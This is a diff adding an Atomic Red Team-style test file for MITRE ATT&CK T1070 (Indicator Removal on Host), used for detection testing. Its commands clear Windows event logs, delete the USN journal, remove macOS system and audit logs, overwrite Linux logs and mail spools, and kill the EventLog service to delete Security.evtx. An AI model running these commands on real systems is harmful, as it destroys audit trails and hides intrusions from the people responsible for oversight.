@@ -1,0 +1,105 @@
+---
+attack_technique: T1070
+display_name: Indicator Removal on Host
+
+atomic_tests:
+- name: Clear Logs
+  description: |
+    Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty.
+  supported_platforms:
+    - windows
+  input_arguments:
+    log_name:
+      description: Windows Log Name, ex System
+      type: String
+      default: System
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      wevtutil cl #{log_name}
+
+- name: FSUtil
+  description: |
+    Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon exectuion, no output
+    will be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn
+  supported_platforms:
+    - windows
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      fsutil usn deletejournal /D C:
+    cleanup_command: |
+      fsutil usn createjournal m=1000 a=100 c:
+
+- name: rm -rf
+  description: |
+    Delete system and audit logs
+  supported_platforms:
+    - macos
+    - linux
+  executor:
+    name: sh
+    command: |
+      rm -rf /private/var/log/system.log*
+      rm -rf /private/var/audit/*
+
+- name: Overwrite Linux Mail Spool
+  description: |
+    This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.
+  supported_platforms:
+    - linux
+  input_arguments:
+    username:
+      description: Username of mail spool
+      type: String
+      default: root
+  executor:
+    name: bash
+    command: |
+      echo 0> /var/spool/mail/#{username}
+
+- name: Overwrite Linux Log
+  description: |
+    This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.
+  supported_platforms:
+    - linux
+  input_arguments:
+    log_path:
+      description: Path of specified log
+      type: Path
+      default: /var/log/secure
+  executor:
+    name: bash
+    command: |
+      echo 0> #{log_path}
+
+- name: Delete System Logs Using PowerShell
+  description: |
+    Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments.
+    Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
+    When this service get's stopped, it is automatically restarted and the Security.evtx folder re-created.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+      Stop-Process -Id $eventLogId -Force
+      Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+    cleanup_command: |
+      Start-Service -Name EventLog
+
+- name: Delete System Logs Using Clear-EventLogId
+  description: |
+    Clear event logs using built-in PowerShell commands.
+    Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Clear-EventLog -logname Application
